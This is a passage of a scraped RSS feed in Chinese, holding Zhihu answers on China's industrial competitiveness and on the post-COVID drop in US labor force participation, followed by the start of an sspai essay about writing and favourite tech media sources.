data-pid=\"jQlgNxoS\">汽车制造行业作为这个门类的重中之重，我国已经迎头赶上。作为全球最大的汽车制造和消费大国，我国汽车制造业已经非常成熟，各类零部件国产化率非常高。另外，随着汽车电动化升级，我国在电子和软件方面的优势，以及在电池领域的抢先发力，叠加市场规模和政府调控扶持的能力，已经显现出弯道超车的态势。许多传统COEM，如比亚迪，长城，五菱，长安，吉利等，都已经量产了非常有竞争力的车型，而造车新势力也有如蔚来汽车这样的企业逐渐崭露头角。在2021年慕尼黑国际车展上，先后有多家中资车企宣布在德国设立子公司销售中国电动车，而蔚来汽车作为最早布局德国的电动车企，已经开始在欧洲交付汽车。而根据我了解到的可靠信息，我国某知名廉价电动车已经获得了日本市场的所有市场准入，并在2021年向日本交付约10000量国产电动车。对于极端保守和排外的日本汽车市场，这个成就无疑值得大书特书。</li>\n<li data-pid=\"g6J5DTWh\">精密仪器和设备制造方面，德国日本乃至美国都具有相当优势。这里的原因乃在于这些产品大多是上两次工业革命的结果，而我国完美错过了这两次工业革命的重大时期。这类产品有一个非常重要的特点，在于其中关于材料和制造工艺的信息并不是一种” Knowledge”，某种可以通过科学的研究方法，逐步积累理性推理得到的结论；相反，他们许多的核心技术和工艺是一种“Knowhow”，一种通过经验和试错不断累积得到的知识，这种知识甚至并没有许多的科学和逻辑支持。典型的如材料学领域各种成分的配比，工艺领域各种热处理的技术等等。这些知识直接影响到许多基础零部件的性能和精密程度，比如轴承，齿轮等等，而这些基础零部件的质量又直接影响到最终制成品的关键性能。<br>但这些领域并非无解。一方面，作为世界工厂的我国的市场规模远胜于德日欧美的本土市场，对于本土企业研发试错具有良好的土壤；另一方面，大量的这些德日美企业本身在这些领域德利润率并不高，他们中有许多企业有很大的动力为了赢得中国市场的地位而转让技术乃至出售股权。有野心和理想的中国设备制造商通过并购、合资等方式获得这些德日企业（特别是德国企业）的Knowhow并没有很高的难度。</li>\n<li data-pid=\"1dAhucSd\">最后，某些精密产品市场实在是太小，任何研发投入的相对收益都太低。就好像，某人已经在某小村庄门口的河流上建了一座桥收过路费，由于村庄的规模太小，任何后来者再建一座桥的预期经济收益都为负。某中资汽车电子制造商曾和我们讨论收购他们的一家特种检测制具的德国制造商，希望通过收购能打破外资在这一领域的垄断。但后来经过市场调研发现，这个检测制具光品类就有400多种，而全球市场总容量大约10亿美元，但有5家主要的欧美日韩企业竞争。上亿欧元的资金投入收购这个企业，并不能显著改善已经固化几十年的市场结构，而降低利润推进销售则会进一步降低整个市场的规模。最后抱憾放弃了收购。<br>尽管我国是一个全产业链国家，但希冀于在每一个细分领域都做到龙头显然是不经济的，而且会适得其反，失去可能的产业链上的盟友。</li>\n</ul>\n<p data-pid=\"yX-dP9uA\"><b>3. </b>被认为是高科技制造业产品的比例来看，我国事实上遥遥领先德国美国和日本，而从全球来看，也仅有台湾，韩国，新家坡等少数几个电子芯片领域的领先国家和地区对于我国拥有优势。从更广阔的角度来看，韩国、台湾、新家坡事实上都是我国庞大的电子产业链中的一个环节。我国在这个领域的优势是非常强势的。</p>\n<p data-pid=\"yQMBlZmK\">总而言之，随着我国在电动车、新能源装备这两个领域的重点发力，我国在中等技术产品领域将更加强势，而随着我国汇率进一步升高，我国在第一维度的人均数据也将快速增长。在未来10-15年，CIP指数接近甚至超过第一名的德国，绝对不是痴人说梦。</p>\n<p data-pid=\"ZoBxFOYO\">最后，联合国如果改变一下统计口径，将台湾省和香港地区纳入完整中国的统计，我们CIP指数可能已经超过德国了。</p>\n<p><img src=\"https://pic2.zhimg.com/v2-b47780f500817bf462d634dc820fca9b_720w.jpg?rss\" data-caption=\"台湾省位列全球第八\" data-size=\"normal\" data-rawwidth=\"940\" data-rawheight=\"428\" data-watermark=\"watermark\" data-original-src=\"v2-b47780f500817bf462d634dc820fca9b\" data-watermark-src=\"v2-ce6db67989ca583959d4de9028c24919\" data-private-watermark-src=\"v2-6caa89335721b5e7f2e0922b52c03f25\"></p>\n<p></p>\n<br><br>\n来源：知乎 www.zhihu.com<br>\n    \n作者：<a href=\"http://www.zhihu.com/people/will-shen-78?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=author\">will shen</a><br><br>\n【知乎日报】千万用户的选择，做朋友圈里的新鲜事分享大牛。\n        <a href=\"http://daily.zhihu.com/?utm_source=rssyanwenzi&amp;utm_campaign=tuijian&amp;utm_medium=rssnormal\" target=\"_blank\">点击下载</a><br><br>\n此问题还有 <a href=\"http://www.zhihu.com/question/19551117/answer/2311197881?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">1304 个回答，查看全部。</a><br>\n                延伸阅读：<br><a href=\"http://www.zhihu.com/question/25248350?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">为什么有的薯片表面要做成波浪状的？</a><br><a href=\"http://www.zhihu.com/question/59053616?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">飞机上让带些零食吗？薯片、饼干，沙琪玛……？</a><br>\n","link":"http://www.zhihu.com/question/19551117/answer/2311197881?utm_campaign=rss&utm_medium=rss&utm_source=rss&utm_content=title"},{"title":"从劳动参与率看美国就业市场复苏态势，未来美国经济发展趋势如何？","date":"2022-02-15 04:10:52","description":"\n<p data-pid=\"Dyc5nkbd\">2021年以来，美国通胀高企。根据民主党政府的广泛解释，他们认为原因乃在于：</p>\n<p data-pid=\"mG1KOgej\">1.\t供应链不畅导致的短缺<br>2.\t供应链上的核心岗位劳动力缺失导致从港口、码头、仓储、货运、乃至食品生产，餐厅服务等等一系列的行业无法回归疫情之前完全的生产效率<br>3.\t企业招聘岗位回升，失业率已经几乎下降到历史低点（接近于完全就业），因此劳动力的短缺的原因便聚焦于劳动参与率的下降。</p>\n<p><img src=\"https://pic3.zhimg.com/v2-7bd98258b3e5b84cd52bcd07bbb6b939_720w.png?rss\" data-caption=\"就业短缺对美国经济造成冲击。彼得森经济研究所。\" data-size=\"normal\" data-rawwidth=\"948\" data-rawheight=\"452\" data-watermark=\"watermark\" data-original-src=\"v2-7bd98258b3e5b84cd52bcd07bbb6b939\" data-watermark-src=\"v2-6d34a5f554c1d0e4e26e15bed00ef301\" data-private-watermark-src=\"v2-b24b29fd9eee9deb34761372e5776395\"></p>\n<p data-pid=\"FlZJzE0m\">4.\t企业囤积居奇谋取暴利发国难财（拜登、沃伦）</p>\n<p data-pid=\"o2fNGjfJ\">且不说民主党政府对于通货膨胀的解释完全避而不谈货币和财政政策这个通常认为的通货膨胀的主因和最大推手而将责任抛给企业和供应链（事实上还是在说工人的待遇和福祉不佳使得大量人口在疫情冲击下不愿意回到这些岗位——事实上还是责备企业），现在LFPR（劳动参与率）这个一直以来可能都排不进去前十的经济指标忽然变得十分重要。</p>\n<p data-pid=\"dXGo4Jto\">美国的LFPR自2000年达到高点以来，呈现长期下降趋势。直到新冠疫情发生后，产生了骤降。</p>\n<p><img src=\"https://pic3.zhimg.com/v2-b86242b30cc06094cba3c2280f9f2217_720w.png?rss\" data-caption=\"新冠疫情对LFPR造成了约1.7%的冲击。彼得森经济研究所。\" data-size=\"normal\" data-rawwidth=\"940\" data-rawheight=\"376\" data-watermark=\"watermark\" data-original-src=\"v2-b86242b30cc06094cba3c2280f9f2217\" data-watermark-src=\"v2-ff3488d3b22c5959aa4f639e821dd3e3\" data-private-watermark-src=\"v2-e4155f9211228f7973dfd73bb8a52bb5\"></p>\n<p data-pid=\"tOW7dW1v\">长期以来学院宏观经济学关注于各种指标和数据，将社会经济行为的主体理想化，理性化和物化，推演出诸多冰冷的政策实践。在这种理论的驱使下，失业率和企业招聘岗位的数据几乎是唯一值得关注的就业数据——似乎只要有足够多的企业愿意招聘各种各样的工作岗位，那么劳动者就会自觉自愿的去填补缺口，失业率降低，人民安居乐业。</p>\n<p data-pid=\"ukkmJFbX\">可是，如果劳动者拒绝参与就业呢？如果人们宁愿甘心在家“躺平”而不愿去工厂流水线、仓库、货车、餐厅、酒店去出卖劳动挣取微薄（或许不微薄）的时薪呢？</p>\n<p data-pid=\"pra1CkIM\">经历疫情，LFPR数据骤然下降提示养尊处优的经济学家和政策制定者们来思考人们的工作意愿的问题。</p>\n<p data-pid=\"QLpJcRuA\">在美国，老龄化是一个长期的困扰。婴儿潮一代的人口退休离开就业岗位被用于解释2010年到2019年的LFPR数据。依据<a href=\"http://link.zhihu.com/?target=http%3A//www.census.gov\" class=\" external\" target=\"_blank\" rel=\"nofollow noreferrer\"><span class=\"invisible\">http://www.</span><span class=\"visible\">census.gov</span><span class=\"invisible\"></span></a>发布的一份报告《Aging Boomers Solve a Labor Market Puzzle》声称：</p>\n<blockquote data-pid=\"o6WtDEJm\">“按年龄划分的劳动力参与率<br>全美16岁及以上人口的劳动力参与率从2010年的64.4%下降到2019年的63.6%。 <br>尽管总体下降，但从 2010 年到 2019 年，所有年龄组的劳动力参与率都有所上升：<br>16 至 19 岁：37.7% 至 39.9%。<br>20 至 64 岁：77.5% 至 78.3%。<br>65 至 74 岁：24.8% 至 26.8%。<br>75 岁及以上：5.7% 至 7.2%。<br>这种明显的比率差异可以用美国人口年龄分布的巨大变化来解释。”</blockquote>\n<p data-pid=\"6yjBZIlc\">既然所有年龄段人群的劳动参与率提升而总劳动参与率下降，那么可能的原因在于20-64岁的核心就业人口由于年龄增长进入65岁以上人群，两个年龄群体的LFPR差异导致总参与率的下降。</p>\n<p data-pid=\"KbInxEom\">然而，需要注意的是：</p>\n<p data-pid=\"6seRTMXm\">1.\tLFPR早2000年到2015年底经历了这个长期下滑过程，15年间从67%下降到62.6%，年均降幅约0.3个百分点。<br>2.\t川总执政期间从2017年（事实上可以上提一年到2016年）到2020年疫情之间，美国LFPR处于稳中有升，甚至在2020年2约达到了63.5%的高点。</p>\n<p data-pid=\"MUs5vV19\">如果说2000-2015年美国人民的劳动热情下降是一个平缓的老龄化原因，那么，将年均0.3%的老龄化带来的LFPR降低计入统计，那么，奥巴马末年和川总3年基本将美国人民的劳动热情提高了整整2%（63.5-62.6+1.2=2.1%）。</p>\n<p data-pid=\"tENYbL6F\">依照以上假设和推算，自2020年2月至2021年底，由于老龄化造成的LFPR下降约为0.5%。</p>\n<p data-pid=\"TzYDRvBJ\">另外，从历史上看，失业率与劳动力参与率程负相关。失业率每上升一个百分点，经人口调整的劳动力参与率就会下降约 0.15 个百分点（PIIE）。将这种关系应用于当前美国劳动力市场，可得因失业影响导致的劳动力参与率下降约为 0.4 个百分点（经调整的失业率约为6%，高于疫情之前的3.6%）。</p>\n<p data-pid=\"vrU3hoRd\">考虑到美国疫情至今LFPR总共下降1.7%，因此有0.8%的部分（1.7-0.5-0.4），需要额外理解原因。 </p>\n<p><img src=\"https://pic4.zhimg.com/v2-4f3ed7e49385a00da3e7d6436be97d12_720w.png?rss\" data-caption=\"拆分1.7%的LFPR降幅。彼得森经济研究所。\" data-size=\"normal\" data-rawwidth=\"988\" data-rawheight=\"488\" data-watermark=\"watermark\" data-original-src=\"v2-4f3ed7e49385a00da3e7d6436be97d12\" data-watermark-src=\"v2-b48d1133f2686d8de3a8e0a0ea26843a\" data-private-watermark-src=\"v2-b1e8c9797990bd7e8abed27200716de1\"></p>\n<p data-pid=\"SSWetBsG\">对于3亿两千万人口的美国而言，0.8%的因新冠流行而造成的LFPR下降意味着将近250万核心劳动力脱离就业市场。</p>\n<p data-pid=\"dq2kXE1G\">依据布鲁金斯学会对劳动力性别和教育程度的劳动参与率的研究表明，与疫情前5年（2014-19）的平均水平相比，低技能人口脱离就业市场的比例比高技能人口明显偏高，而返回劳动市场的比例则相对偏低。这一现象在低技能女性人口中表现得尤为明显。</p>\n<p><img src=\"https://pic3.zhimg.com/v2-94b43f53a51b1ecf7698cdc575fb1d30_720w.png?rss\" data-caption=\"布鲁金斯学会对不同性别和教育水平人群的劳动参与率进行了研究。布鲁金斯学会。\" data-size=\"normal\" data-rawwidth=\"940\" data-rawheight=\"1183\" data-watermark=\"watermark\" data-original-src=\"v2-94b43f53a51b1ecf7698cdc575fb1d30\" data-watermark-src=\"v2-43eee4672297a167d359f3e36a26100d\" data-private-watermark-src=\"v2-584dd46b7dd0d99d9390918595f145b3\"></p>\n<p data-pid=\"DGfRmWwJ\"> 另一个角度也可以印证这个现象。对低技能女性员工雇佣最多的一些服务性行业，包括休闲，酒店，零售业和医疗看护等领域，这些中低薪酬的岗位面临所有行业内最严重的离职潮和员工短缺。 </p>\n<p><img src=\"https://pic1.zhimg.com/v2-03a5f44ac16fcb528944dc762e390b42_720w.png?rss\" data-caption=\"不同行业的员工短缺。英国卫报\" data-size=\"normal\" data-rawwidth=\"940\" data-rawheight=\"860\" data-watermark=\"watermark\" data-original-src=\"v2-03a5f44ac16fcb528944dc762e390b42\" data-watermark-src=\"v2-fb8b35435294c1c1c2c6493505873719\" data-private-watermark-src=\"v2-24757d11ef1a41334853df6c5a47a5a6\"></p>\n<p data-pid=\"usOTgzlc\"><b>问题的症结可能出在儿童保育和教育行业。</b></p>\n<p data-pid=\"tY7o5gOh\">由于儿童保育和教育的大规模私有化，美国政府每年在该领域的支出比例在发达国家之中可能是最低的之一，儿童人均年财政支出仅约500美元（相对欧盟国家的水平约为14500美元）。根据美国人口普查局的数据，从 1990 年到 2011 年，美国的托儿费用增加了 40%。即便如此，从单个婴儿到 4 岁的平均托儿费用依然可达每年9100美元到9600美元之间。而且这些费用差别很大，从密西西比州的每年5436美元到华盛顿特区的每年24243美元不等。大约51%的美国人生活在儿童保育沙漠中，该地区被定义为没有儿童保育提供者或 5 岁以下儿童与累积儿童保育能力之比大于 3:1 的地区。（相比而言，德国等欧盟国家拥有大量的公立育儿机构，费用全免。而为了鼓励生育，国家常年向家长发放上千欧元儿童抚育金来缓解育儿的经济压力。）</p>\n<p data-pid=\"gRndVeBz\">即便如此，美国的育儿和幼教机构依然在生存线上挣扎，幼儿抚育人员和教师的时薪不足15美元，甚至低于餐馆和超市营业员。</p>\n<p data-pid=\"fsqDHfL-\">随着疫情的爆发，初期采取严格隔离措施的一段时间，许多机构无以为继，惨淡关门，其中许多的幼儿教师变成了富裕家庭的保姆。而当经济逐渐恢复，疫情带来的防疫要求进一步提升了抚育机构的成本和幼儿教师的工作压力，更多的人离职而去。</p>\n<p data-pid=\"M0s-p5ng\">依据华盛顿邮报的统计，截止2021年9月，托儿服务的从业人员减少了12万6000余人。是所有行业中就业缺口最大的行业之一。</p>\n<p><img src=\"https://pic4.zhimg.com/v2-94bb63b3608ff2345680dfa21c1a5baf_720w.png?rss\" data-caption=\"儿童保育的员工短缺情况在所有行业中最为严重。华盛顿邮报\" data-size=\"normal\" data-rawwidth=\"940\" data-rawheight=\"799\" data-watermark=\"watermark\" data-original-src=\"v2-94bb63b3608ff2345680dfa21c1a5baf\" data-watermark-src=\"v2-52523f213ad534553e74b8ed6cae1493\" data-private-watermark-src=\"v2-b1089e4e5559b55034d1e8bf88673392\"></p>\n<p data-pid=\"8--IMOu5\">另外，由于近年来儿童保护方面的繁复立法，特别是各类犯罪背景调查又使得雇佣流程变得极为繁琐。从业者需要从州政府办公室获得必要的无犯罪记录证明，托儿中心必须对潜在雇用人员进行指纹识别并检查以确保他们没有被列入性犯罪者登记册，并且在过去五年中没有在他们居住的任何州犯下忽视或虐待儿童的行为。这在新冠疫情大流行期间变得更为困难。</p>\n<p data-pid=\"TTlUD1i0\">儿童保育行业的紧缺带来的后果是几何级数增长的。</p>\n<p data-pid=\"f7M3cv4t\">一方面，获得保育空缺的难度变得越来越大，许多家长需要在名单中排队将近两年才能在任何机构获得一个席位。</p>\n<p data-pid=\"4LBdX5WA\">另一方面，聘请私人保姆或者进入私立机构的成本变得极其昂贵，对于一个中低收入家庭而言，一位时薪15-20美元的蓝领工作的母亲的税后收入除去相应的参加工作的成本比如交通费、社交和餐饮开支，支付一个私立育儿机构的费用完全入不敷出。</p>\n<p data-pid=\"5BEqvTku\">另外，对于一些中高收入的家庭而言，儿童和学生群体较低的疫苗接种率，以及美国各地时长爆发的反疫苗反口罩运动，使得许多家长对于将孩子送回学校面临极高的感染风险感到忧心忡忡。不少家庭选择全职妈妈（爸爸）在家教育孩子，并进行一些零散的远程工作。</p>\n<p data-pid=\"nJtNfYPL\">总体而言，由于幼儿和教育的原因，依据华盛顿邮报的报道，有约160万的17岁以下儿童的妈妈告别的工作岗位，这约占美国LFPR的0.5%。</p>\n<p data-pid=\"J0YCXOrY\">美国的领导层显然也认识到了这个问题。拜登和国会中的民主党高层希望在儿童保育上花费约 4500 亿美元，作为总额 3.5 万亿美元法案的一部分，这将是有史以来对联邦政府支持的儿童保育项目的最大投资。该立法将降低中低收入家庭的托儿费用，并为看护者提供更高的工资，同时为所有 3 岁和 4 岁儿童提供免费的幼儿园。</p>\n<p data-pid=\"vzvuf8SM\">共和党人和一些温和的民主党人，例如来自西弗吉尼亚州的参议员乔曼钦， 对整体法案的高昂价格持否定态度。就这个部分而言，他们希望看到一个更小的一揽子计划，其中的援助更针对最需要帮助的人。“教育我们所有的孩子不是联邦政府的责任，”曼钦说到。</p>\n<hr>\n<p data-pid=\"-0kBfhj4\">在LFPR总体下降的1.7%之内，还有约0.3%的比例（除去老龄化造成的0.5%，失业率造成的0.4%，育儿母亲造成的0.5%）可能是由于更多样的原因产生，包括对疫情的恐惧带来的严重精神压力（柳叶刀发表了一篇论文专门论述了疫情对年轻劳动人口带来的心理压力而可能导致离职），国家抗役补贴，零元购等请罪的泛滥等等。</p>\n<p data-pid=\"HnrKoVu2\">根据以上分析，新冠病毒对美国就业市场特别是劳动参与率的影响其中约超过1%的部分可能是长期性的，甚至这都不是一个经济问题，而是美国贫富差异在另一个维度的又一次体现。而缺乏领导力的这届民主党政府以及美国共和党人无意也无力解决这些问题。</p>\n<p><img src=\"https://pic2.zhimg.com/v2-056ff12099d076d335e0203a49ec65ae_720w.jpeg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"368\" data-rawheight=\"369\" data-watermark=\"watermark\" data-original-src=\"v2-056ff12099d076d335e0203a49ec65ae\" data-watermark-src=\"v2-066bfc7294f02b3c305340ed98ef4086\" data-private-watermark-src=\"v2-00b1aff593de7b22761a3139c93ab3f0\"></p>\n<p></p>\n<br><br>\n来源：知乎 www.zhihu.com<br>\n    \n作者：<a href=\"http://www.zhihu.com/people/will-shen-78?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=author\">will shen</a><br><br>\n【知乎日报】千万用户的选择，做朋友圈里的新鲜事分享大牛。\n        <a href=\"http://daily.zhihu.com/?utm_source=rssyanwenzi&amp;utm_campaign=tuijian&amp;utm_medium=rssnormal\" target=\"_blank\">点击下载</a><br>延伸阅读：<br><a href=\"http://www.zhihu.com/question/392256147?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">如果一个经济体的失业率处在自然失业率水平，政府可以不采取措施进行治理，你认为这种看法正确吗？为什么？</a><br><a href=\"http://www.zhihu.com/question/381361650?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">2020年中国失业率会不会大幅度上升？</a><br>\n","link":"http://www.zhihu.com/question/511552506/answer/2326511554?utm_campaign=rss&utm_medium=rss&utm_source=rss&utm_content=title"},{"title":"年度征文 | 写作，是一种生活方式","date":"2022-02-15 03:30:35","description":"\n<p><strong>编注：</strong></p>\n<p>本文是少数派 <a href=\"https://sspai.com/post/70693\" target=\"_blank\">2021 年度征文 </a>活动 <code>#生活 21</code> 标签下的入围文章。本文仅代表作者本人观点，少数派对标题和排版略作调整。</p>\n<p>和往年不同，今年文章的数据表现将很大程度上决定征文活动的最终走向，包括「双倍稿酬（由飞书赞助）」活动奖励、最终票选名单以及征文奖品类型。如果你喜欢这篇文章，不妨通过充电或评论的方式支持作者。</p>\n<hr>\n<p>好像，「XX 是一种生活方式」这样的句型要被用烂了。但是我实在想不到一个更好的方法去总结我接下来要写出来的这篇文章。毕竟，在少数派的写作本身，就是我生活的一部分，而我的生活方式中的确有不少成分是围绕写作这个目的去展开的。尽管我不是职业作家（天哪，我觉得如果我有那个自律的能力的话，我很想成为一名自由撰稿人），但是写作已经超越了爱好的范畴 —— 所以我只好把它定义为生活方式。</p>\n<p>去年年底，我恰好迷上了美剧《Sex and the City》。这部美剧以 Carrie Bradshaw，纽约一家报纸的专栏作家，书写她自己和朋友们的罗曼史，作为展开的方式。当然了，这部美剧以其开放大胆的镜头著称，但是我却总是为主角 Carrie 写作的方式（时间、地点）而着迷：有的时候她是在窗边，看着对面的一对情侣做着不可描述的事情；有的时候是坐在床上，点着一根烟，开始冥想；有的时候是因为受不了公寓的拥挤不堪，出门去咖啡馆看着来来往往的人群 —— 或许正是这份写作时无拘无束的自由，让我最为渴望吧。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c7t9n0db34taatkrl000.png\"><figcaption>Carrie 和她的 PowerBook G3</figcaption></figure><h2>阅读是写作的开始</h2>\n<p>获取信息可能是输出信息的第一步 —— 我反正是这么觉得。自由的写作本身就来自大量的泛读，怪不得人们常说「<s>天下文章一大抄</s>」。套路都摆在那里，写作的时候留心借鉴，的确是事半功倍的。</p>\n<p>我的阅读来源其实还算不上太「广泛」，只有一些会经常关注的媒体 / up / YouTuber，作为信息来源我个人认为已经足够，同时也不会每天感到信息过载。由于个人感兴趣的点主要集中在科技 / 数码方面，关注的媒体网站也大多数在此列。</p>\n<p>不过，在列举之前，我要先免责声明一下：</p>\n<ul>\n<li>以下列举的 YouTuber / UP 主 / 网站 / 媒体，除了少数派之外，与我本人<strong>没有任何利益往来</strong>。与少数派的利益往来，仅限于我作为少数派作者的稿酬，不构成任何商业意义上的广告。</li>\n<li>以下列举的 YouTuber / UP 主 / 网站 / 媒体，尽管是我的信息源，但这不表明我认同这些 YouTuber / UP 主 / 网站 / 媒体上曾经发布的、正在发布的，或者是将来要发布的<strong>所有观点</strong>。</li>\n<li>以下列举的 YouTuber / UP 主 / 网站 / 媒体<strong>并非我信息来源的全部</strong>。</li>\n</ul>\n<h3>YouTuber / B 站 up</h3>\n<p>现在是一个视频的时代，对吧？所以免不了的，我也关注了一些 YouTuber 和 B 站 up，主要也是有关科技的。关注视频类的账号，其实主要是因为有些时候看文字测评<s>很容易睡着</s>，视频其实从形式上有趣、直接得多，同时获得的信息量并不算少。每次 Apple 产品的测评解禁，我总是蹲守几家媒体第一时间的上手评测。</p>\n<p>但同时，视频能给到的信息终归有限 —— 无论是时长，还是视频本身具有的更强的直观性，都是它提供更多信息的阻碍。因此，我也会在视频后参考媒体报道，去关注一些很多视频评测尚未提到的细节。</p>\n<h4>极客湾</h4>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c7t9n0tb34taavnbb3e0.png\"><figcaption>极客湾对于 M1 的解析</figcaption></figure><p>看极客湾的视频，其实是从 iPhone 12 开始的。他们做的 A14 分析视频，确实让我见识到了「极客」二字不是说说而已。硬核的硬件解说视频一直是极客湾的主打，无论是高通骁龙、麒麟还是天玑系列，极客湾一直使用专业而且易懂的方式讲解不同移动 CPU 之间的比较与代际关系（要是没记错的话，把原神作为 benchmark 也是从他们这里卷起来的一阵风吧？）</p>\n<ul>\n<li><a href=\"https://www.bilibili.com/video/BV1ih411n7BR?spm_id_from=333.999.0.0\" target=\"_blank\">苹果A15性能分析：它几乎征服了原神！_哔哩哔哩_bilibili</a></li>\n<li><a href=\"https://www.bilibili.com/video/BV1MY411W74g?spm_id_from=333.999.0.0\" target=\"_blank\">骁龙8 Gen1性能分析：功耗爆炸高！但GPU很强..._哔哩哔哩_bilibili</a></li>\n<li><a href=\"https://www.bilibili.com/video/BV1ZZ4y1K7zg?spm_id_from=333.999.0.0\" target=\"_blank\">我们仍未知道你的下一台电脑的名字。_哔哩哔哩_bilibili</a></li>\n</ul>\n<h4>LinusTechTips</h4>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c7t9n15b34taatkrl00g.png\"><figcaption>Linus Tech Tips 的传统艺能 —— 光速吟唱</figcaption></figure><p>老莱「知名果黑」的名声坐实之后，我就开始关注这家视频了。现在，LinusTechTips 旗下在 YouTube 早已不止一个号，可以说是已经演变成为科技评测界的「巨头」之一了。LinusTechTips 的更新频率无疑是我关注的科技类 up 主 / YouTuber 中最为频繁的（几近日更），同时内容也是最为丰富的 —— 从装机到最新的硬件评测再到科技生活中常见的小问题，LinusTechTips 都有涉及，风格也是风趣幽默，并非科技测评类账号常见的严肃中立风格。并且，其中并不乏一些十分硬核的分析（例如针对电脑关机相关问题的 <a href=\"https://www.bilibili.com/video/BV11Y411b7Gt?spm_id_from=333.999.0.0\" target=\"_blank\">troubleshooting</a>）。 最后，LinusTechTips 也在 B 站开设了官方账号，并且聘请国内字幕组进行双语字幕翻译，可以说是十分良心了。</p>\n<ul>\n<li><a href=\"https://www.bilibili.com/video/BV1Ra4111795?spm_id_from=333.999.0.0\" target=\"_blank\">【官方双语】诺顿带我来挖矿，能出什么问题呢？#linus谈科技_哔哩哔哩_bilibili</a></li>\n<li><a href=\"https://www.bilibili.com/video/BV1RY411W7aE?spm_id_from=333.999.0.0\" target=\"_blank\">【官方双语】终于简单点了... Linus &amp; Luke日用Linux挑战第三集#linus谈科技_哔哩哔哩_bilibili</a></li>\n</ul>\n<h4>先看评测</h4>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c7t9n1db34ta9bscq1sg.png\"><figcaption>先看评测的显示器横屏与购买建议</figcaption></figure><p>先看评测的一系列横评比较类视频是给我留下最为深刻的印象的：从真无线耳机到显示器再到吸尘器、洗衣机，先看评测并非专注于 3C 数码，而是将生活电器也纳入了评测对比的行列，可以说是更加贴近生活的，但同时在专业性上不打折扣。《<a href=\"https://www.bilibili.com/video/BV15o4y1d7yV?spm_id_from=333.999.0.0\" target=\"_blank\">55 寸 4K 电视只要 1200，拼多多爆款电视能买吗？</a>》是我认为他们目前做得最好的一条 —— 它不仅从产品参数以及实测性能的角度告诉我们如何进行选择，更是帮我们（消费者）做了 out-of-the-box thinking：厂商为了减少成本，到底可以做到什么程度？</p>\n<h3>各类科技媒体</h3>\n<h4><a href=\"https://sspai.com/\">少数派</a></h4>\n<p>既然「偷师」，那么自家人的网站怎么能少！少数派上的文章尽管我并不是每篇都很感兴趣，我也没有充值会员，但是仅仅是首页的内容，其实就足够我在写作时参考和学习。</p>\n<p>有些相关主题的写作，我可能会去少数派翻一翻前人的作品，从中汲取一些灵感。比如今年写《<a href=\"https://sspai.com/post/67303\" target=\"_blank\">2021 年最适合你的翻译 App 是什么？你可能需要这份指南</a>》的时候，我就<s>无情</s>参考了 Harvey 在 2020 年写的 <a href=\"https://sspai.com/post/60086\" target=\"_blank\">相关对比</a>，从这篇文章中学习了翻译工具比较的框架，最终在自己的文章中加入了个人更加关注的特性点。</p>\n<p>此外，写《<a href=\"https://sspai.com/post/68415\" target=\"_blank\">城市漫游指南 | 魂断莫斯科</a>》时，我也参考了此前少数派其他《城市漫游指南》系列的文章，看看大家对于一个陌生的城市，最为关注的是哪些要点 —— 再结合自己对于莫斯科的情感和体验，去描摹个人在莫斯科的生活。</p>\n<p>也正因为如此，我真的非常感谢少数派这个平台，可以参考的资源那么多的同时，也保证了内容的质量和更新的频率。</p>\n<h4><a href=\"http://wired.com/\" target=\"_blank\">WIRED 连线</a></h4>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c7t9n1lb34taatkrl010.png\"></figure><p>《WIRED 连线》是一本科技数字生活类的国际杂志。这本杂志本身能够提供的信息倒不算特别多，但是每次它的主题文章都能够有那么一两篇特别吸引我的眼球。比如我这两天看到的有关俄罗斯勒索软件团队的文章，了解了不少 2020 年以来勒索软件的发展历程，以及这些团队中的风云变幻。</p>\n<ul><li><a href=\"https://www.wired.com/story/trickbot-malware-group-internal-messages/\" target=\"_blank\">Inside Trickbot, Russia’s Notorious Ransomware Gang</a></li></ul>\n<p>此外，WIRED 也有不少生活类内容值得关注。我从这里每周收取的 newsletter 分为正刊系列和 Gadget Lab 系列，后者就主要介绍了一些数字生活中可能需要的许多东西。比如最近的一期就是有关如何自助维修 iPhone 的系列文章，包括可能需要的准备、工具，以及一旦翻车如何自救的 tips，十分受用。</p>\n<p>此外，WIRED 由于是传统纸媒，所以它的遣词造句以及行文结构通常十分专业。在几乎每一篇故事性的新闻报道中，我们都既可以看到事件清晰的来龙去脉，也不会觉得过于无聊。相比接下来介绍的其他更为「硬核」的电子消费科技媒体，WIRED 探讨的更多是科技与人类社会生活之间的交互。</p>\n<h4><a href=\"http://theverge.com/\" target=\"_blank\">The Verge</a></h4>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c7t9n25b34ta9bscq1t0.png\"></figure><p>每年 Apple 新品发布，我都会特别注意 The Verge 第一时间的上手评测。我还记得去年 Apple 新品发布季的时候，The Verge 的工作人员仿佛没有睡觉一般，不停地在 YouTube 上发视频、在网站上发文。The Verge 这些测评给人的感觉，就是单刀直入、不加掩饰。每一篇评测，它都能抓住我最想了解的点去深挖。</p>\n<p>比如，最近的评测是讲 Intel 12 代 CPU 的。相比其他媒体对于它性能改进的「大加赞赏」，以及对其相比 11 代 Intel 处理器的改进，The Verge 另辟蹊径，犀利地指出了 form factor 这一重要因素。目前送测媒体的 12 代 CPU 是封装在 MSI GE76 Raider 17 英寸游戏本中。先不提这 3999 美元的价格，只是这个大小、重量和续航，就已经让它几乎配不上「laptop」这个定位了（The Verge 原话是：这是最接近桌面计算设备的笔记本了）。尽管 Core i9 